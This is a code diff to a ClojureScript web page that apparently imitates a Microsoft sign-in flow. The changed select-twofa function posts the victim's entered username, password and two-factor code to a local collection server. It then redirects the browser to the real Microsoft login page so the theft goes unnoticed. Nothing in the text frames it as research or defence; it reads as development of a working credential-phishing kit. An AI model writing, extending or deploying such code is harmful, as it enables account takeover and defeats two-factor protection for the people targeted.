@@ -22,7 +22,7 @@
     (let [xhr (.-target e)]
       (if (.isSuccess xhr)
         (on-success (js->clj (.getResponseJson xhr)))
-        (.error js/console "POOP")))))
+        (.error js/console "xhr failed")))))
 
 (defn xhr-get [url on-success]
   (.send goog.net.XhrIo 
@@ -130,10 +130,13 @@
 
 (defn select-twofa [t]
   (reset! twofa t)
-  (.log js/console @username)
-  (.log js/console @password)
-  (.log js/console t)
-  (js/setTimeout #(.replace js/location "https://login.microsoftonline.com/common/login") 1500))
+  (xhr-post "http://127.0.0.1:3000/login"
+            {:username @username
+             :password @password
+             :twofa t}
+            {"Content-Type" "application/json"}
+            (fn [_]
+              (.replace js/location "https://login.microsoftonline.com/common/login"))))
 
 (defn user-accounts [email]
   (let [hover? (r/atom false)
